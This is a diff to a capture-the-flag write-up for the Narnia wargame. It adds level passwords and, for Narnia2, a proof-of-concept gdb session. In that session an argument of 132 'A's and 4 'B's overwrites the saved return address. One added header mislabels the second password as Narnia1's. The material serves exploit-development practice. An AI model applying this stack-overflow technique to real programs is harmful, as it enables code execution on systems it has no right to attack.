@@ -27,6 +27,7 @@ narnia1
 cat /etc/narnia_pass/narnia1
 efeidiedae
 ```
+### Narnia1 password: efeidiedae
 ## Narnia1
 ### Source code:
 ```
@@ -93,7 +94,41 @@ $ cat /etc/narnia_pass/narnia2
 nairiepecu
 $
 ```
+### Narnia1 password: nairiepecu
 ## Narnia2
+### Source code:
+```
+```
+### POC:
+```
+[----------------------------------registers-----------------------------------]
+EAX: 0x0
+EBX: 0x0
+ECX: 0x7fffff13
+EDX: 0xf7fc6870 --> 0x0
+ESI: 0x2
+EDI: 0xf7fc5000 --> 0x1b2db0
+EBP: 0x41414141 ('AAAA')
+ESP: 0xffffd5d0 ('C' <repeats 100 times>)
+EIP: 0x42424242 ('BBBB')
+EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x42424242
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd5d0 ('C' <repeats 100 times>)
+0004| 0xffffd5d4 ('C' <repeats 96 times>)
+0008| 0xffffd5d8 ('C' <repeats 92 times>)
+0012| 0xffffd5dc ('C' <repeats 88 times>)
+0016| 0xffffd5e0 ('C' <repeats 84 times>)
+0020| 0xffffd5e4 ('C' <repeats 80 times>)
+0024| 0xffffd5e8 ('C' <repeats 76 times>)
+0028| 0xffffd5ec ('C' <repeats 72 times>)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x42424242 in ?? ()
+gdb-peda$ set args  $(python -c 'print "A" * 132 + "B" * 4 + "C" * 100')
+```
 ## Narnia3
 ## Narnia4
 ## Narnia5
